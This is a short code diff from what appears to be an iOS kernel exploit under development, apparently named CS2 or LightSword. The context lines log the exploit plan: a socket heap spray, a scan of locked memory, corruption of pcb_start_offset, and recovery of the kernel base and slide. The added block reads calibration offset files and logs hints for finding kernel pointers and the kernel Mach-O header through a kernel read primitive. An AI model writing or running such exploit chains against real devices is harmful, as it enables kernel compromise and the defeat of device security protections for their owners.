@@ -98,6 +98,29 @@ static void cs2_write_banner(void) {
     cs2_log("budget: %d s. Panic = reboot; recovered log shows last step.", CS2_TIME_BUDGET_SEC);
     cs2_log("expect: 22528-socket spray -> pc mapping -> 8x128MiB mlocked scan");
     cs2_log("        -> pcb_start_offset / target corrupted -> kernel_base / kernel_slide");
+    {
+        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+        NSString *hot = [NSString stringWithContentsOfFile:[docs stringByAppendingPathComponent:@"lightsword_hot.txt"]
+                                                  encoding:NSUTF8StringEncoding error:nil];
+        NSString *wrong = [NSString stringWithContentsOfFile:[docs stringByAppendingPathComponent:@"lightsword_wrong.txt"]
+                                                    encoding:NSUTF8StringEncoding error:nil];
+        __block int nh = 0, nw = 0;
+        [[hot componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]]
+         enumerateObjectsUsingBlock:^(NSString *line, NSUInteger idx, BOOL *stop) {
+             if (line.length >= 2 && [line hasPrefix:@"0x"]) nh++;
+         }];
+        [[wrong componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]]
+         enumerateObjectsUsingBlock:^(NSString *line, NSUInteger idx, BOOL *stop) {
+             if (line.length >= 2 && [line hasPrefix:@"0x"]) {
+                 nw++;
+                 if (nw <= 6) cs2_log("WRONG off %s (calib spray-page confusion; hunt kptr in CS2 scan)",
+                                      line.UTF8String ?: "?");
+             }
+         }];
+        cs2_log("boot-learn: lightsword_hot=%d lightsword_wrong=%d (WRONG=copy confusion of SOCK_DGRAM pages; FOREIGN/kptr still required)",
+                nh, nw);
+        cs2_log("look-for: pcb_start_offset, KERNEL POINTER (>>36==0xfffffff0), kernel_base, kread32==0xfeedfacf");
+    }
 }
 
 /* LightSword arm license (2026-10-24): the LightSword calib has PROVEN the
